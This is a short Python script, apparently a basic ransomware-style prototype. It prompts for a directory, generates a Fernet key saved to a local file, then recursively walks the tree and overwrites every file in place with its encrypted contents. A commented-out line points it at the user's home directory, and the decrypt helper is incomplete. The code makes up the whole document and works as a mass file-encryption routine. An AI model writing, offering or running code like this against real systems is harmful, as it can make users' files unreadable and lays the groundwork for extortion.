import os
from cryptography.fernet import Fernet

def main():
    '''directory = os.path.expanduser('~')
    print(directory)'''
    directory = input("Enter directory to encrypt!!!:").strip('\"')
    
    key = Fernet.generate_key()
    with open('filekey.key', 'wb') as filekey:
        filekey.write(key)
    global fernetobj
    fernetobj = Fernet(key)
    recursivelist(directory)


def recursivelist(path):
    #accepted_filetypes = [".jpg",".png",".py",".txt"]
    directory = path
    #iterate through all files in base dir
    for file_or_dir_name in os.listdir(directory):
            #join subdirectory or file to path
            f = os.path.join(directory, file_or_dir_name)
                #check if file
            if os.path.isfile(f):
                encryptfile(f,fernetobj)
                continue
                #check if dir
            elif os.path.isdir(f):
                nextdirectory = f
                recursivelist(nextdirectory)   
             


def encryptfile(file,fernetobj):
        print(file)
        with open(file, 'rb') as unencryptedfile:
            original = unencryptedfile.read()
        encrypted = fernetobj.encrypt(original)
        with open(file, 'wb') as encryptedfile:
            encryptedfile.write(encrypted)
   
    

def decrypt(file,fernetobj):
    x = fernetobj.decrypt(file)
    print(x)
    return x
main()